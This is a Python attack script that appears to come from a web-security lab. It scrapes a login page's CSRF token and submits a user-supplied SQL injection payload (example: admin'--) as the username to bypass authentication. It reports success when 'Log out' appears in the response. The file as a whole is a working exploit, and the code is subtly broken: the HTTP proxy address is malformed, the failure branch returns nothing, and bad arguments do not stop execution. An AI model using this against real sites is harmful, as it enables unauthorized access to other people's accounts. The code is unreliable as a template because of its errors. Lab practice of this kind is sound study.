import requests
import sys
import urllib3
from bs4 import BeautifulSoup

#Disables security warning for insecure connections
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#setting proxies for burp
proxies = {'http' : 'http:127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')

    #This method captures it only when it is the first input
    #csrf = soup.find('input')['value'] 

    #with this method of getting the CSRF token, you will be able to capture it even if it is not the first input
    csrf = soup.find('input', {'name': 'csrf'})
    csrf = csrf.get('value')
    return csrf


def exploit_sqli(s, url, payload):
    csrf=get_csrf_token(s, url)
    data = {'csrf': csrf,
            'username': payload,
            'password': 'anything'}
    
    r = s.post(url, data=data, verify=False, proxies=proxies)
    response = r.text
    if 'Log out' in response:
        return True
    else: False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except:
        print('[+] Usage: %s <url> <sqli-payload>' % sys.argv[0])
        print("[+] Example: %s http://example.com admin'--" % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL Injection successful')
    else:
        print('[-] SQL Injection unsuccessful.')